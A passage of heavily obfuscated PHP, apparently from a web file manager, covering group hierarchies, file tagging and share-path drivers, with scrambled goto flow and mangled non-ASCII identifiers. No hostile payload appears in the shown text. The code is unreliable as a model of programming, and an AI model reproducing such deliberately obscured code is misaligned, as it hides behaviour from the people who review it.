$Bİ‘åÉÅˆÄ = $fÕ¯Ù“ŸøÒ[$BââªÏêÃï][$f‚ÇŸ¬ŒáÇ[2112]]; $Fê‹‹ìã¬— .= "\x53\x45\114\105\x43\x54\x20\x2a\x20\x46\122\x4f\x4d\40\x28\x53\x45\x4c\x45\103\124\x20\47{$Bİ‘åÉÅˆÄ}\x5f\x63\150\x69\154\x64\47\x20\x61\x73\x20\150\x61\x73\x20\106\122\x4f\115\40\140{$D’ÕÖŒä—˜}\x60\x20\x77\150\x65\x72\x65\40\147\162\x6f\x75\x70\x49\x44\x3d{$Bİ‘åÉÅˆÄ}\x20\154\x69\x6d\151\164\40\x31\51\x20\x61\x73\x20\164\x62\x5f{$Bİ‘åÉÅˆÄ}\x20\x75\x6e\151\x6f\x6e\40\141\x6c\x6c\40"; if (($A‰ºÀĞâÕ >= 20 || $BââªÏêÃï == $c©¶ÛÕ¶†ì - 1) && $Fê‹‹ìã¬—) { $Fê‹‹ìã¬— = substr($Fê‹‹ìã¬—, 0, -strlen($f‚ÇŸ¬ŒáÇ[451])); $fÌ»õÍä«… = $this->query($Fê‹‹ìã¬—); $eáØÊñô›Œ = array_merge($eáØÊñô›Œ, $fÌ»õÍä«…); $A‰ºÀĞâÕ = 0; $Fê‹‹ìã¬— = $f‚ÇŸ¬ŒáÇ[33]; } } goto cÔíó¿î˜Ø; Aô§…ÄªÁ: } private function _listAppendMeta(&$bÂÌ¿òŒ¬‹, $CÎÔ¡¼İ‰) { goto D°´Ë²º‘; f–…È‘œª‚: foreach ($bÂÌ¿òŒ¬‹ as &$f¤™¹‡»¨) { $f¤™¹‡»¨[$a‚Şäó‚¿Û[417]] = array(); if (isset($d…”´¸‡‚Ã[$f¤™¹‡»¨[$a‚Şäó‚¿Û[2112]]])) { $f¤™¹‡»¨[$a‚Şäó‚¿Û[417]] = $d…”´¸‡‚Ã[$f¤™¹‡»¨[$a‚Şäó‚¿Û[2112]]]; } } unset($f¤™¹‡»¨); goto cÒˆ‹èÔ‚Ó; Dğ ˜¨âŸ: $d…”´¸‡‚Ã = array_to_keyvalue_group($d…”´¸‡‚Ã, $a‚Şäó‚¿Û[2112]); foreach ($d…”´¸‡‚Ã as &$F©çô¸È‹) { $F©çô¸È‹ = array_to_keyvalue($F©çô¸È‹, $a‚Şäó‚¿Û[89], $a‚Şäó‚¿Û[359]); } unset($F©çô¸È‹); goto f–…È‘œª‚; D°´Ë²º‘: $a‚Şäó‚¿Û =& $_SERVER[¦·]; $ağœ‚°ÇÇ– = array($a‚Şäó‚¿Û[2112] => array($a‚Şäó‚¿Û[7], $CÎÔ¡¼İ‰)); $d…”´¸‡‚Ã = Model($a‚Şäó‚¿Û[2190])->where($ağœ‚°ÇÇ–)->select(); goto Dğ ˜¨âŸ; cÒˆ‹èÔ‚Ó: } protected function parentLevelArray($F¤„å‰…Ëò) { $CÃ¶ÀÆÎ…¢ =& $_SERVER[¦·]; $F¤„å‰…Ëò = explode($CÃ¶ÀÆÎ…¢[47], trim($F¤„å‰…Ëò, $CÃ¶ÀÆÎ…¢[47])); $F¤„å‰…Ëò = array_remove_value($F¤„å‰…Ëò, $CÃ¶ÀÆÎ…¢[470]); return $F¤„å‰…Ëò; } private function _listAppendParent(&$B¼··ƒßŒä) { goto B”¹ò‘Ûàğ; AÚÑêà·Ë¡: if ($Dß¥¿Ì”Ø) { $AÊÑ ŠéÃ› = array($CŸˆÍË[2189] => array($CŸˆÍË[384], $Dß¥¿Ì”Ø)); $c£Öºõ÷è = $this->field($CŸˆÍË[2202])->where($AÊÑ ŠéÃ›)->select(); $DÇŠÊ™¡Ê¦ = array_to_keyvalue($c£Öºõ÷è, $CŸˆÍË[2112], $CŸˆÍË[28]); $F¡ğ¬´ÛÍ“ = array_merge_index($F¡ğ¬´ÛÍ“, $DÇŠÊ™¡Ê¦); } $D¾É²ŸïÄ‰ = $GLOBALS[$CŸˆÍË[6]][$CŸˆÍË[84]][$CŸˆÍË[2203]]; foreach ($B¼··ƒßŒä as &$fÜÃ›µêËá) { $a´Á­ÈäÁ = $this->parentLevelArray($fÜÃ›µêËá[$CŸˆÍË[461]]); $cÌÂ¬³´àÄ = $CŸˆÍË[33]; foreach ($a´Á­ÈäÁ as $EŠ®¥³À£’ => $aî„¢“®í) { if ($D¾É²ŸïÄ‰ && $EŠ®¥³À£’ == 0) { continue; } $cÌÂ¬³´àÄ .= $F¡ğ¬´ÛÍ“[$aî„¢“®í] . $CŸˆÍË[8]; } if ($a´Á­ÈäÁ) { $cÌÂ¬³´àÄ .= $fÜÃ›µêËá[$CŸˆÍË[28]]; } $fÜÃ›µêËá[$CŸˆÍË[465]] = str_replace($CŸˆÍË[469], $CŸˆÍË[8], $cÌÂ¬³´àÄ); } goto EÅÛÍôÍƒ; EÅÛÍôÍƒ: unset($fÜÃ›µêËá); goto FëÅõë¡Í‹; B”¹ò‘Ûàğ: $CŸˆÍË =& $_SERVER[¦·]; $F¡ğ¬´ÛÍ“ = array(); foreach ($B¼··ƒßŒä as &$fÜÃ›µêËá) { $F¡ğ¬´ÛÍ“[$fÜÃ›µêËá[$CŸˆÍË[2112]]] = $fÜÃ›µêËá[$CŸˆÍË[28]]; $a´Á­ÈäÁ = $this->parentLevelArray($fÜÃ›µêËá[$CŸˆÍË[461]]); foreach ($a´Á­ÈäÁ as $aî„¢“®í) { if (!isset($F¡ğ¬´ÛÍ“[$aî„¢“®í])) { $F¡ğ¬´ÛÍ“[$aî„¢“®í] = 0; } } } goto EåÆ÷É×; EåÆ÷É×: unset($fÜÃ›µêËá); $Dß¥¿Ì”Ø = array(); foreach ($F¡ğ¬´ÛÍ“ as $EŠ®¥³À£’ => $bˆåë—Ç…) { if (!$bˆåë—Ç…) { $Dß¥¿Ì”Ø[] = $EŠ®¥³À£’; } } goto AÚÑêà·Ë¡; FëÅõë¡Í‹: } private function _listAppendSourceRoot(&$f’á‹Úï, $Dç’öó) { goto F®˜ÒŠ·; F®˜ÒŠ·: $eÁ¸šê¹¶Ç =& $_SERVER[¦·]; $d³ˆµ¸–—… = array($eÁ¸šê¹¶Ç[371] => SourceModel::TYPE_GROUP, $eÁ¸šê¹¶Ç[463] => 0, $eÁ¸šê¹¶Ç[458] => array($eÁ¸šê¹¶Ç[7], $Dç’öó)); $BŸØçˆ¡¾Ë = $eÁ¸šê¹¶Ç[2204]; goto dŠ¥¿¸±Û”; dŠ¥¿¸±Û”: $e¿“Â“´œ  = Model($eÁ¸šê¹¶Ç[753])->order($eÁ¸šê¹¶Ç[2205])->field($BŸØçˆ¡¾Ë)->where($d³ˆµ¸–—…)->select(); $e¿“Â“´œ  = array_to_keyvalue($e¿“Â“´œ , $eÁ¸šê¹¶Ç[458]); $e¿“Â“´œ  = array_remove_key($e¿“Â“´œ , $eÁ¸šê¹¶Ç[458]); goto aÈæ§×£ª°; aÈæ§×£ª°: foreach ($f’á‹Úï as &$a…Úñ·ª¼») { $a…Úñ·ª¼»[$eÁ¸šê¹¶Ç[391]] = $e¿“Â“´œ [$a…Úñ·ª¼»[$eÁ¸šê¹¶Ç[2112]]] ? $e¿“Â“´œ [$a…Úñ·ª¼»[$eÁ¸šê¹¶Ç[2112]]] : array(); } unset($a…Úñ·ª¼»); goto a¥Õ¤øÊˆ; a¥Õ¤øÊˆ: } protected function groupMerge($e†’õé‡œª) { $e†’õé‡œª = array_values(array_unique($e†’õé‡œª)); $DéÀ³Ø…²Ü = array(); for ($e‡Œ«Ò”ªª = 0; $e‡Œ«Ò”ªª < count($e†’õé‡œª); $e‡Œ«Ò”ªª++) { $dô°èéßË = !1; for ($f°¶ãùµÍ¾ = 0; $f°¶ãùµÍ¾ < count($e†’õé‡œª); $f°¶ãùµÍ¾++) { if ($e‡Œ«Ò”ªª == $f°¶ãùµÍ¾) { continue; } if ($this->isParentOf($e†’õé‡œª[$f°¶ãùµÍ¾], $e†’õé‡œª[$e‡Œ«Ò”ªª])) { $dô°èéßË = !0; break; } } if (!$dô°èéßË) { $DéÀ³Ø…²Ü[] = $e†’õé‡œª[$e‡Œ«Ò”ªª]; } } return $DéÀ³Ø…²Ü; } protected function isParentOf($e‰÷ËÏ±Ú¡, $C¦ÀÛø¸É) { goto cÚ††µÔ¸©; D÷„¿¨ÀŞà: return !1; goto bÂ ³‰÷; AÊ›æÌ¼ëè: $a¶Íàö¥½ˆ = $this->getInfoSimple($C¦ÀÛø¸É); $C»¨ÃÃåÁõ = $C†İÑÌ“†Ğ[$dÙêå‹Ø[461]] . $e‰÷ËÏ±Ú¡ . $dÙêå‹Ø[47]; if (substr($a¶Íàö¥½ˆ[$dÙêå‹Ø[461]], 0, strlen($C»¨ÃÃåÁõ)) == $C»¨ÃÃåÁõ) { return !0; } goto D÷„¿¨ÀŞà; cÚ††µÔ¸©: $dÙêå‹Ø =& $_SERVER[¦·]; if (!$e‰÷ËÏ±Ú¡ || !$C¦ÀÛø¸É || $e‰÷ËÏ±Ú¡ == $C¦ÀÛø¸É) { return !1; } $C†İÑÌ“†Ğ = $this->getInfoSimple($e‰÷ËÏ±Ú¡); goto AÊ›æÌ¼ëè; bÂ ³‰÷: } public function groupShowRoot($aÛåØ£ñ„Ç, $Eàæ‚¯Û¿ = false) { goto BÄ‹Ç‘Ã†œ; A¬Û£ÄÏÚË: if ($Eàæ‚¯Û¿ && count($dõ¦âµñÀÃ) == 1) { return $F™åÄ·øØæ; } if (!$Añ´ä¼…Ò[$CùÜíˆ†ó‹[417]] || !isset($Añ´ä¼…Ò[$CùÜíˆ†ó‹[417]][$CùÜíˆ†ó‹[2187]]) || $Añ´ä¼…Ò[$CùÜíˆ†ó‹[417]][$CùÜíˆ†ó‹[2187]] == $CùÜíˆ†ó‹[2161]) { return $this->groupShowRoot($dõ¦âµñÀÃ[count($dõ¦âµñÀÃ) - 1], $Eàæ‚¯Û¿); } if ($Añ´ä¼…Ò[$CùÜíˆ†ó‹[417]][$CùÜíˆ†ó‹[2187]] == $CùÜíˆ†ó‹[346]) { $aÛÔƒˆ›İ = explode($CùÜíˆ†ó‹[47], $Añ´ä¼…Ò[$CùÜíˆ†ó‹[417]][$CùÜíˆ†ó‹[2188]]); if ($aÛÔƒˆ›İ) { $F™åÄ·øØæ = array_merge($F™åÄ·øØæ, $aÛÔƒˆ›İ); } } goto d–êĞ©´ÌÆ; BÄ‹Ç‘Ã†œ: $CùÜíˆ†ó‹ =& $_SERVER[¦·]; $Añ´ä¼…Ò = $this->getInfo($aÛåØ£ñ„Ç); if (!$Añ´ä¼…Ò) { return array(); } goto f¿÷„â®¥; f¿÷„â®¥: $dõ¦âµñÀÃ = $this->parentLevelArray($Añ´ä¼…Ò[$CùÜíˆ†ó‹[461]]); $F™åÄ·øØæ = array($aÛåØ£ñ„Ç); if (count($dõ¦âµñÀÃ) == 0) { return $F™åÄ·øØæ; } goto A¬Û£ÄÏÚË; d–êĞ©´ÌÆ: return $F™åÄ·øØæ; goto BÇå á²½‰; BÇå á²½‰: } protected function resetParentLevel() { $c•ˆëÙÆÍÙ =& $_SERVER[¦·]; $C÷à×‚ÂÁæ = $c•ˆëÙÆÍÙ[2112]; $CÕÚõâØóÒ = $this->select(); $CÕÚõâØóÒ = array_to_keyvalue($CÕÚõâØóÒ, $C÷à×‚ÂÁæ); foreach ($CÕÚõâØóÒ as $f½Ï„Îº–) { goto Bâè‚Å¯Çµ; CÁ´óåÖ”î: $EáïïèÍÑ[] = 0; $EáïïèÍÑ = $c•ˆëÙÆÍÙ[47] . implode($c•ˆëÙÆÍÙ[47], array_reverse($EáïïèÍÑ)) . $c•ˆëÙÆÍÙ[47]; $this->setNamePinyin($f½Ï„Îº–[$C÷à×‚ÂÁæ], $f½Ï„Îº–[$c•ˆëÙÆÍÙ[28]]); goto dÓ‰Ÿ¸Ë…; dÓ‰Ÿ¸Ë…: $this->where(array($C÷à×‚ÂÁæ => $f½Ï„Îº–[$C÷à×‚ÂÁæ]))->save(array($c•ˆëÙÆÍÙ[527] => $EáïïèÍÑ)); goto DÍ—¸×İªå; Bâè‚Å¯Çµ: $CƒªÉÖ† = $f½Ï„Îº–; $EáïïèÍÑ = array(); while ($CƒªÉÖ†[$c•ˆëÙÆÍÙ[463]] != 0) { $EáïïèÍÑ[] = $CƒªÉÖ†[$c•ˆëÙÆÍÙ[463]]; $CƒªÉÖ† = $CÕÚõâØóÒ[$CƒªÉÖ†[$c•ˆëÙÆÍÙ[463]]]; } goto CÁ´óåÖ”î; DÍ—¸×İªå: } return $CÕÚõâØóÒ; } public function groupNameAuto($bâˆ¥Ô¤Ú‡, $e³Ú­ãÅ»¢) { $cààİ©Ôª• =& $_SERVER[¦·]; $eÕ¶¼Ÿ×¤ = $this->where(array($cààİ©Ôª•[368] => $bâˆ¥Ô¤Ú‡))->getField($cààİ©Ôª•[28], !0); if (!$eÕ¶¼Ÿ×¤ || !in_array($e³Ú­ãÅ»¢, $eÕ¶¼Ÿ×¤)) { return $e³Ú­ãÅ»¢; } for ($DŸ‰¢ªŸ·• = 1; $DŸ‰¢ªŸ·• <= count($eÕ¶¼Ÿ×¤) + 1; $DŸ‰¢ªŸ·•++) { $Bêƒ¿”È“ã = $e³Ú­ãÅ»¢ . "\x28{$DŸ‰¢ªŸ·•}\x29"; if (!in_array($Bêƒ¿”È“ã, $eÕ¶¼Ÿ×¤)) { return $Bêƒ¿”È“ã; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($dµÈÍ«¢ø¹) { $DÀİ¢âªŒí =& $_SERVER[¦·]; return array($DÀİ¢âªŒí[2206] => array($dµÈÍ«¢ø¹[0], $DÀİ¢âªŒí[2207]), $DÀİ¢âªŒí[2208] => array($dµÈÍ«¢ø¹[0], $DÀİ¢âªŒí[2209])); } protected function get($B­ò³ªˆ±) { $D‰îîçĞŒ£ =& $_SERVER[¦·]; $cµÜÈ™â‹ = Model($D‰îîçĞŒ£[460])->metaGet($B­ò³ªˆ±, $D‰îîçĞŒ£[2210]); $c©‡á·ê¤ = json_decode($cµÜÈ™â‹, !0); return $c©‡á·ê¤ ? $c©‡á·ê¤ : array($D‰îîçĞŒ£[2211] => $D‰îîçĞŒ£[83], $D‰îîçĞŒ£[354] => array()); } protected function set($Ağ”Ìã¡, $dÆªäƒ§ÇÀ) { $a£—ÎÃÇ•« =& $_SERVER[¦·]; $dÆªäƒ§ÇÀ = $dÆªäƒ§ÇÀ ? $dÆªäƒ§ÇÀ : array($a£—ÎÃÇ•«[2211] => $a£—ÎÃÇ•«[83], $a£—ÎÃÇ•«[354] => array()); Model($a£—ÎÃÇ•«[460])->metaSet($Ağ”Ìã¡, $a£—ÎÃÇ•«[2210], json_encode($dÆªäƒ§ÇÀ)); return Model($a£—ÎÃÇ•«[460])->metaSet($Ağ”Ìã¡, $a£—ÎÃÇ•«[2210], json_encode($dÆªäƒ§ÇÀ)); } protected function getByTagID($dœ¾™Ü®ùº, $c¯ŒØ”èç) { goto c«Êœ“£Ó”; c«Êœ“£Ó”: $EÇ°•„÷ï =& $_SERVER[¦·]; if (!$dœ¾™Ü®ùº || !$c¯ŒØ”èç) { return !1; } if (!Model($EÇ°•„÷ï[460])->getInfoSimple($dœ¾™Ü®ùº)) { return !1; } goto C¸¸÷ÌôÚš; Fô²Ìõ²ÅÏ: return is_array($Cêô‘½ç´¨) ? $Cêô‘½ç´¨ : !1; goto f§õ‹»ß±; C¸¸÷ÌôÚš: $fô“ïäÄÈ¿ = $this->get($dœ¾™Ü®ùº); if (!$fô“ïäÄÈ¿ || !isset($fô“ïäÄÈ¿[$EÇ°•„÷ï[354]])) { return !1; } $Cêô‘½ç´¨ = array_find_by_field($fô“ïäÄÈ¿[$EÇ°•„÷ï[354]], $EÇ°•„÷ï[367], $c¯ŒØ”èç); goto Fô²Ìõ²ÅÏ; f§õ‹»ß±: } public function listSource($B¯Êíãò»œ, $FéÁÓ“—Ì) { goto e—ÎŸ›ÑÒÓ; e—ÎŸ›ÑÒÓ: $b™Œä«ÏŞ =& $_SERVER[¦·]; if ($FéÁÓ“—Ì && !is_array($FéÁÓ“—Ì)) { $FéÁÓ“—Ì = array($FéÁÓ“—Ì); } $FÕã–ÏŞ = $this->listData($B¯Êíãò»œ); goto CëÛÉ©ç; F±‹Œ–³Ü›: $FÆÚ‘ˆåâˆ = array_to_keyvalue($C¦èæÔŠ¥¨[$b™Œä«ÏŞ[73]], $b™Œä«ÏŞ[33], $b™Œä«ÏŞ[369]); $dÇß§Û„ä† = array_merge($FÆÚ‘ˆåâˆ, $bÕËïà›ã); foreach ($eĞæ›³Á†Ú as $E×ŒŒ´õª) { if (!in_array($E×ŒŒ´õª, $dÇß§Û„ä†)) { $c©˜Šƒ¡ºÂ[] = $E×ŒŒ´õª; } } goto FÓíãÄ¦©¢; CëÛÉ©ç: $d‰£¾¦Ó…Š = array(); foreach ($FÕã–ÏŞ as $A‡¥ßÉ¦ù) { $E×ŒŒ´õª = $A‡¥ßÉ¦ù[$b™Œä«ÏŞ[75]]; if (!$E×ŒŒ´õª) { continue; } if (!isset($d‰£¾¦Ó…Š[$E×ŒŒ´õª])) { $d‰£¾¦Ó…Š[$E×ŒŒ´õª] = array(); } $d‰£¾¦Ó…Š[$E×ŒŒ´õª][] = $A‡¥ßÉ¦ù[$b™Œä«ÏŞ[393]]; } $eĞæ›³Á†Ú = array(); goto A•¹‹¹ìŸ; A•¹‹¹ìŸ: foreach ($d‰£¾¦Ó…Š as $c‘«‰Àä‡ğ => $A‰öçÁ¿¹’) { $Câ’Ì—Åã = !0; if (!$FéÁÓ“—Ì) { $eĞæ›³Á†Ú[] = $c‘«‰Àä‡ğ; continue; } foreach ($FéÁÓ“—Ì as $EÆÑğÅëò™) { if (!in_array($EÆÑğÅëò™, $A‰öçÁ¿¹’)) { $Câ’Ì—Åã = !1; break; } } if ($Câ’Ì—Åã) { $eĞæ›³Á†Ú[] = $c‘«‰Àä‡ğ; } } if (!$eĞæ›³Á†Ú) { return array(); } $C¦èæÔŠ¥¨ = Model($b™Œä«ÏŞ[1122])->listSource(array($b™Œä«ÏŞ[383] => array($b™Œä«ÏŞ[384], $eĞæ›³Á†Ú))); goto fÛì²íÈ¼; FÓíãÄ¦©¢: if ($c©˜Šƒ¡ºÂ) { $this->removeBySource($B¯Êíãò»œ, $c©˜Šƒ¡ºÂ); } return $C¦èæÔŠ¥¨; goto a ›°™êôŠ; fÛì²íÈ¼: if (!$C¦èæÔŠ¥¨ || count($eĞæ›³Á†Ú) == $C¦èæÔŠ¥¨[$b™Œä«ÏŞ[351]][$b™Œä«ÏŞ[352]]) { return $C¦èæÔŠ¥¨; } $c©˜Šƒ¡ºÂ = array(); $bÕËïà›ã = array_to_keyvalue($C¦èæÔŠ¥¨[$b™Œä«ÏŞ[74]], $b™Œä«ÏŞ[33], $b™Œä«ÏŞ[369]); goto F±‹Œ–³Ü›; a ›°™êôŠ: } protected function listData($dàçˆ–Ø¶¢) { $C×â¶¿ÅÌë =& $_SERVER[¦·]; $fºõÉŞÊöÉ = array($C×â¶¿ÅÌë[1432] => 0, $C×â¶¿ÅÌë[436] => array($C×â¶¿ÅÌë[2212], 0), $C×â¶¿ÅÌë[388] => $C×â¶¿ÅÌë[2213] . $dàçˆ–Ø¶¢); $Cõ»‰²ÉéŠ = $C×â¶¿ÅÌë[2214]; $Dè¹ÚÁ÷á£ = $this->field($Cõ»‰²ÉéŠ)->where($fºõÉŞÊöÉ)->order($C×â¶¿ÅÌë[2215])->select(); return $Dè¹ÚÁ÷á£ ? $Dè¹ÚÁ÷á£ : array(); } protected function addToTag($eÜÍ‘¤íÙÎ, $e®½¨òµèŞ, $BŸ¼È´¨°Ò) { $d„ëõÆ¬Í® =& $_SERVER[¦·]; if (!$this->getByTagID($eÜÍ‘¤íÙÎ, $BŸ¼È´¨°Ò) || !$e®½¨òµèŞ) { return !1; } if (!Model($d„ëõÆ¬Í®[753])->pathInfo($e®½¨òµèŞ)) { return !1; } $A²à©‡§¯‹ = array($d„ëõÆ¬Í®[1432] => 0, $d„ëõÆ¬Í®[436] => $BŸ¼È´¨°Ò, $d„ëõÆ¬Í®[387] => $e®½¨òµèŞ, $d„ëõÆ¬Í®[388] => $d„ëõÆ¬Í®[2216] . $eÜÍ‘¤íÙÎ, $d„ëõÆ¬Í®[386] => $d„ëõÆ¬Í®[33], $d„ëõÆ¬Í®[2116] => 0); if ($this->where($A²à©‡§¯‹)->find()) { return !1; } return $this->add($A²à©‡§¯‹); } protected function removeFromTag($d§ÑŸîìé•, $BàĞÖœµ, $C‰°Ô³‘‘) { $DÒ±ªÄ‹ =& $_SERVER[¦·]; if (!$this->getByTagID($d§ÑŸîìé•, $C‰°Ô³‘‘) || !$BàĞÖœµ) { return !1; } if (is_array($BàĞÖœµ)) { $BàĞÖœµ = array($DÒ±ªÄ‹[7], $BàĞÖœµ); } $d÷âì‘‘öĞ = array($DÒ±ªÄ‹[1432] => 0, $DÒ±ªÄ‹[436] => $C‰°Ô³‘‘, $DÒ±ªÄ‹[388] => $DÒ±ªÄ‹[2216] . $d§ÑŸîìé•, $DÒ±ªÄ‹[387] => $BàĞÖœµ); return $this->where($d÷âì‘‘öĞ)->delete(); } protected function removeByTag($dÕÑ¯‡ºà, $F‹ğÃ±…¨×) { $cË†¾÷¼¼ =& $_SERVER[¦·]; if (!$this->getByTagID($dÕÑ¯‡ºà, $F‹ğÃ±…¨×)) { return !1; } $D÷÷šäã¬Ø = array($cË†¾÷¼¼[1432] => 0, $cË†¾÷¼¼[436] => $F‹ğÃ±…¨×, $cË†¾÷¼¼[388] => $cË†¾÷¼¼[2216] . $dÕÑ¯‡ºà); return $this->where($D÷÷šäã¬Ø)->delete(); } protected function removeBySource($C×¥…ÂÍÛÏ, $dç¾ñ‚¹î‚) { $FÈ£˜’¨°× =& $_SERVER[¦·]; if (!$C×¥…ÂÍÛÏ || !$dç¾ñ‚¹î‚) { return !1; } if (is_array($dç¾ñ‚¹î‚)) { $dç¾ñ‚¹î‚ = array($FÈ£˜’¨°×[7], $dç¾ñ‚¹î‚); } $Ağ‘á÷šÎ = array($FÈ£˜’¨°×[1432] => 0, $FÈ£˜’¨°×[387] => $dç¾ñ‚¹î‚, $FÈ£˜’¨°×[436] => array($FÈ£˜’¨°×[930], 0), $FÈ£˜’¨°×[388] => $FÈ£˜’¨°×[2216] . $C×¥…ÂÍÛÏ); return $this->where($Ağ‘á÷šÎ)->delete(); } } goto b¶–ô½ø½”; fëÜËŞ±Ã: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Dè‰ÙÜÖŸ‰) { $this->pathParse = $Dè‰ÙÜÖŸ‰; $this->model = Model($_SERVER[¦·][1122]); } public function getPathOuter($BÕ»ö¦¤Û) { $Eàó½…¾ëÔ =& $_SERVER[¦·]; if (!$BÕ»ö¦¤Û) { return $BÕ»ö¦¤Û; } $aï…õ¹®Šñ = $this->parse($BÕ»ö¦¤Û); return trim(KodIO::makeShare($this->pathParse[$Eàó½…¾ëÔ[367]], $aï…õ¹®Šñ[$Eàó½…¾ëÔ[367]]), $Eàó½…¾ëÔ[8]); } protected function infoParse($D§õ÷„ø§±, $FŠ¸‡ÂŠ‚í = false, $AŒ„Œšˆ½ = false) { $a„ˆ¹ÉÎˆ½ =& $_SERVER[¦·]; $Dí¼·á‘ì = $this->pathParse[$a„ˆ¹ÉÎˆ½[367]]; $E†¦ÆƒÓÁÆ = trim($this->pathParse[$a„ˆ¹ÉÎˆ½[1015]], $a„ˆ¹ÉÎˆ½[8]); return Action($a„ˆ¹ÉÎˆ½[1129])->sharePathInfo($Dí¼·á‘ì, $E†¦ÆƒÓÁÆ); } public function infoFull($e•Ó›ˆ•ì) { $eİ‡‡Ş™‡ =& $_SERVER[¦·]; $Aô‰öæò‚™ = explode($eİ‡‡Ş™‡[8], trim($e•Ó›ˆ•ì, $eİ‡‡Ş™‡[8])); if (count($Aô‰öæò‚™) > 1) { $fªÍƒ§†Ğ£ = implode($eİ‡‡Ş™‡[8], array_splice($Aô‰öæò‚™, 1)); $Cä¨·¾¶ = $this->model->pathInfoByPath($Aô‰öæò‚™[0], $fªÍƒ§†Ğ£); if (!$Cä¨·¾¶) { return !1; } $this->pathParse[$eİ‡‡Ş™‡[1015]] = $Cä¨·¾¶[$eİ‡‡Ş™‡[369]]; } return $this->infoParse($e•Ó›ˆ•ì); } public function listAll($eŒÑô°³œ) { goto e¯ï§„©ğ¯; FàÔó®§¯‘: $AÇ½†Ùï²Ù = $this->model->listAll($eŒÑô°³œ); $C÷‡´¥«¨ˆ = Model($F¿Â­Ğ·Ğß[537])->getInfo($Fî©ÍÚšÒ[$F¿Â­Ğ·Ğß[441]]); $CôõËôöó‰ = Action($F¿Â­Ğ·Ğß[1129]); goto bºèË±†; bºèË±†: foreach ($AÇ½†Ùï²Ù as &$dì±—Â‚¸) { check_abort(); $dì±—Â‚¸[$F¿Â­Ğ·Ğß[391]] = $CôõËôöó‰->_shareItemeParse($dì±—Â‚¸[$F¿Â­Ğ·Ğß[391]], $C÷‡´¥«¨ˆ); } unset($dì±—Â‚¸); return $AÇ½†Ùï²Ù; goto d‘°»œèŸ; e¯ï§„©ğ¯: $F¿Â­Ğ·Ğß =& $_SERVER[¦·]; $Fî©ÍÚšÒ = IO::info($this->pathParse[$F¿Â­Ğ·Ğß[75]]); if (!$Fî©ÍÚšÒ) { return array(); } goto FàÔó®§¯‘; d‘°»œèŸ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($c‰ß°¢âÏË) { $this->pathParse = $c‰ß°¢âÏË; $this->model = Model($_SERVER[¦·][1122]); } protected function infoParse($eˆ³›£ ä“, $C¥‡¶Ê¢´ = false, $D„¹–•ÀÚõ = false) { $Cè×“šå¿í =& $_SERVER[¦·]; return Action($Cè×“šå¿í[1021])->sharePathInfo($this->pathParse[$Cè×“šå¿í[75]], !0); } public function listPath($c…×çªˆ¤, $CÏ»ÓÑ‹Ëá = false) { $a°²‘é—ÏÄ =& $_SERVER[¦·]; $F‰Ä¹¦ÄŒ = parent::listPath($c…×çªˆ¤, $CÏ»ÓÑ‹Ëá); foreach ($F‰Ä¹¦ÄŒ as $EŠ™®‘°µ‹ => $A ÆÎÕŠŞ) { if (!in_array($EŠ™®‘°µ‹, array($a°²‘é—ÏÄ[73], $a°²‘é—ÏÄ[74]))) { continue; } foreach ($A ÆÎÕŠŞ as $c¨ï³ñƒ±Û => $fêÈÚ·¸˜…) { $F‰Ä¹¦ÄŒ[$EŠ™®‘°µ‹][$c¨ï³ñƒ±Û] = Action($a°²‘é—ÏÄ[1021])->shareItemInfo($fêÈÚ·¸˜…); } } return $F‰Ä¹¦ÄŒ; } public function listAll($fÃˆé˜÷Ö«) { goto a÷ã¦ÚÖ; a÷ã¦ÚÖ: $Dç¹ğí˜ñ =& $_SERVER[¦·]; $A“·ï…Ö‘¼ = IO::info($this->pathParse[$Dç¹ğí˜ñ[75]]); if (!$A“·ï…Ö‘¼) { return array(); } goto EÎª‘ƒ¸Ş; FÙå·î»¦: return $a¨ŠÑí©„ê; goto f©ÕŒ²¼Ö·; EÎª‘ƒ¸Ş: $a¨ŠÑí©„ê = $this->model->listAll($fÃˆé˜÷Ö«); foreach ($a¨ŠÑí©„ê as &$eù±¨–ñˆ×) { $eù±¨–ñˆ×[$Dç¹ğí˜ñ[391]] = Action($Dç¹ğí˜ñ[1021])->shareItemInfo($eù±¨–ñˆ×[$Dç¹ğí˜ñ[391]]); } unset($eù±¨–ñˆ×); goto FÙå·î»¦; f©ÕŒ²¼Ö·: } } class PathDriverDriverShareItem { public function __construct($aÕÆáô„²) { $this->pathParse = $aÕÆáô„²; } public function __call($DêÙ·Åš†•, $d‰’¦ã¨›ç) { $BóÓíšñ¥ =& $_SERVER[¦·]; if (method_exists($this, $DêÙ·Åš†•)) { return; } $E‡Ìƒ÷ù„Œ = call_user_func_array(array($BóÓíšñ¥[1130], $DêÙ·Åš†•), $d‰’¦ã¨›ç); $c¢Æõµœ‡ = array($BóÓíšñ¥[1131], $BóÓíšñ¥[1132], $BóÓíšñ¥[1133], $BóÓíšñ¥[1134], $BóÓíšñ¥[492], $BóÓíšñ¥[494], $BóÓíšñ¥[1135], $BóÓíšñ¥[103], $BóÓíšñ¥[1136], $BóÓíšñ¥[1137]); if (in_array($DêÙ·Åš†•, $c¢Æõµœ‡)) { $E‡Ìƒ÷ù„Œ = $this->getPathOuter($E‡Ìƒ÷ù„Œ); } return $E‡Ìƒ÷ù„Œ; } public function copy($fì®¼–ìÂ, $e¶öÌê³ñ‚, $c·±Ò‰£·Ì = false) { return $this->copyMove($fì®¼–ìÂ, $e¶öÌê³ñ‚, $c·±Ò‰£·Ì, $_SERVER[¦·][492]); } public function move($Dæ¼Õ«æÌº, $CÜ‡»œç¤Ò, $FäŠƒÒ½èË = false) { return $this->copyMove($Dæ¼Õ«æÌº, $CÜ‡»œç¤Ò, $FäŠƒÒ½èË, $_SERVER[¦·][494]); } private function copyMove($b³ÖèÀ‡ÄÙ, $f”Ç¦•…àù, $f¾…¶×Ïñ§, $f¢ƒãö»ø’) { goto DÏ¿ôµâ±å; DÏ¿ôµâ±å: $d¡„ÀŞ² =& $_SERVER[¦·]; $eïÛíÍçîˆ = $f”Ç¦•…àù; $cğÔ¿ÅÙÛ¨ = IO::driverMake($f”Ç¦•…àù); goto Cø¯¤á‹ˆª; Cø¯¤á‹ˆª: if ($cğÔ¿ÅÙÛ¨->pathParse[$d¡„ÀŞ²[1001]]) { $f”Ç¦•…àù = $cğÔ¿ÅÙÛ¨->pathParse[$d¡„ÀŞ²[1001]]; } else { $f”Ç¦•…àù = $eïÛíÍçîˆ; } $BßÌ¿åÏ = 